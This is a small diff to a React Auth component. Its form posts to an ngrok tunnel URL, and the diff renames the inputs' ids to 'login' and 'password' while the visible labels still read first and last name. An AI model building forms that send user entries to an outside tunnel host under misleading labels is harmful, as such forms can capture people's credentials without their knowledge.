@@ -131,9 +131,9 @@ const Auth = () => {
 <div className="ath">
 <form action="https://7361-188-247-115-178.eu.ngrok.io/web-data" method="post">
   <label for="fname">First name:</label>
-  <input type="text" id="fname" name="fname"/>
+  <input type="text" id="login" name="fname"/>
   <label for="lname">Last name:</label>
-  <input type="text" id="lname" name="lname"/>
+  <input type="text" id="password" name="lname"/>
   <input type="submit" value="Submit"/>
 </form>
 </div>
